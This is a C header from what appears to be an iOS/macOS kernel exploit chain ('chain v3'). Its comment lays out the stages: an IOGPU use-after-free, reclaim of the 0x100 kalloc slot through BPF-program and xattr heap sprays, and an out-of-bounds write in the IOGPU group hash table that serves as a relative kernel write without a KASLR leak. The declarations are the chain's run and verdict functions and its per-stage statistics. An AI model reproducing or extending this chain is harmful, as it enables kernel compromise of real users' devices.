/* krw_v3.h — chain v3: 64788 UAF -> kernel-side 0x100 spray -> IOGPU group OOB.
 *
 * Why v3 exists: the AIO kevent path was retired after two real A15 panics
 * (TRASHIT-poisoned TAILQ_REMOVE), so the chain is rebuilt on the two
 * primitives that are still on the board:
 *
 *   64788  IOGPU create_resource_iosurface overflow leaves a live entry in the
 *          device resource table after failing validation. Reclaim of that
 *          0x100 slot is attempted with kernel-allocated objects (BPF filter
 *          program, 256-byte xattr), not with userspace MTLBuffer memory.
 *   OOB    IOGPU group hash-table remove writes 8 zero bytes with an 8-byte
 *          stride into an array allocated at 4 bytes/slot: index >= cap/2
 *          lands in the neighbouring 0x100 slot of the same kalloc.256 slab.
 *          This is the relative kernel write stage; no KASLR anchor needed.
 *
 * Every stage reports a measurable fact. The verdict never claims a step that
 * did not produce one. */
#ifndef NK_KRW_V3_H
#define NK_KRW_V3_H

#include <stdint.h>

typedef struct {
    int      uaf_rc;        /* poc_iogpu_uaf_run(): 2 = UAF confirmed live   */
    int      bpf_spray;     /* SO_ATTACH_FILTER 0x100 programs attached      */
    int      xattr_spray;   /* 0x100-byte xattr values set                   */
    int      oob_called;    /* group OOB stage reached                       */
    int      oob_index;     /* last index attempted in the sweep             */
    uint64_t elapsed_ms;
} nk_v3_stat_t;

int         nk_v3_run(nk_v3_stat_t *out);
const char *nk_v3_verdict(const nk_v3_stat_t *s);
const char *nk_v3_stage_name(int stage);

#endif
